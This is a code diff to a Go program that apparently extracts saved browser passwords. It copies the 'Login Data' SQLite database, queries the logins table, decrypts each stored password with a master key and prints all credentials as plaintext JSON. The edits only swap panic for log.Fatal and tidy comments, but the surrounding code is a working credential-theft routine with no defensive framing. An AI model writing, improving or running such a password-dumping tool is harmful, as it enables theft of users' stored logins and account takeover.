@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"log"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -105,7 +106,7 @@ func getLoginDataPaths() ([]string, error) {
 	return paths, nil
 }
 
-// Passowords decrypt
+// Passoword decrypt
 
 type Password struct {
 	URL      string `json:"url"`
@@ -165,17 +166,19 @@ func decryptPassword(masterKey, encryptedPassword []byte) (string, error) {
 	}
 }
 
+// Start
+
 func main() {
 	var passwords []Password
 
 	masterKey, err := getMasterKey()
 	if err != nil {
-		panic(err)
+		log.Fatal(err)
 	}
 
 	loginDataPaths, err := getLoginDataPaths()
 	if err != nil {
-		panic(err)
+		log.Fatal(err)
 	}
 
 	for _, loginDataPath := range loginDataPaths {
@@ -183,21 +186,21 @@ func main() {
 		dbFileName := "db.sqlite"
 		err := copyFile(loginDataPath, dbFileName)
 		if err != nil {
-			panic(err)
+			log.Fatal(err)
 		}
 		defer os.Remove(dbFileName)
 
 		// Connect to the database
 		db, err := sql.Open("sqlite3", dbFileName)
 		if err != nil {
-			panic(err)
+			log.Fatal(err)
 		}
 		defer db.Close()
 
 		// Extract urls, usernames and encrypted passwords
 		rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
 		if err != nil {
-			panic(err)
+			log.Fatal(err)
 		}
 		defer rows.Close()
 
@@ -207,23 +210,23 @@ func main() {
 			var encryptedPassword []byte
 			err := rows.Scan(&password.URL, &password.Username, &encryptedPassword)
 			if err != nil {
-				panic(err)
+				log.Fatal(err)
 			}
 			password.Password, err = decryptPassword(masterKey, encryptedPassword)
 			if err != nil {
-				panic(err)
+				log.Fatal(err)
 			}
 			passwords = append(passwords, password)
 		}
 		if err := rows.Err(); err != nil {
-			panic(err)
+			log.Fatal(err)
 		}
 	}
 
 	// Print json with all clear passwords
 	json, err := json.Marshal(passwords)
 	if err != nil {
-		panic(err)
+		log.Fatal(err)
 	}
 	fmt.Println(string(json))
 }
